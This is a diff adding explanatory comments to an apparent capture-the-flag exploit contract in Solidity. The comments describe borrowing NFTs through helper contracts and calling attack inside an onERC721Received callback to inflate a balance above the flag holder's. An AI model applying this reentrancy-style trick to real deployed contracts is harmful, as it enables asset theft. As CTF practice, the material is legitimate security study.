@@ -16,6 +16,8 @@ contract Solution {
     IGame private immutable game;
     uint[3] private deck;
 
+    // We need two fren contracts to "borrow" their NFT's. This enables us
+    // to hold more than 3 NFTs during the duration of a tx.
     User u1;
     User u2;
 
@@ -36,7 +38,7 @@ contract Solution {
         game.putUpForSale(deck[1]);
         game.putUpForSale(deck[2]);
 
-        // Deploy 2 User's.
+        // Deploy 2 User frens.
         u1 = new User(address(game));
         u2 = new User(address(game));
 
@@ -60,6 +62,10 @@ contract Solution {
     ) external returns (bytes4) {
         uint balance = game.balanceOf(address(this));
 
+        // During the fight we will lose 3 NFTs. In order to still have a
+        // higher balance than the current flagHolder, we need 7 NFTs as
+        // 7 - 3 = 4 and 4 > 3.
+
         if (balance == 4) {
             // Continue with attack.
             u1.attack(1, 6);
@@ -77,7 +83,6 @@ contract Solution {
 
         return IERC721Receiver.onERC721Received.selector;
     }
-
 
 }
 
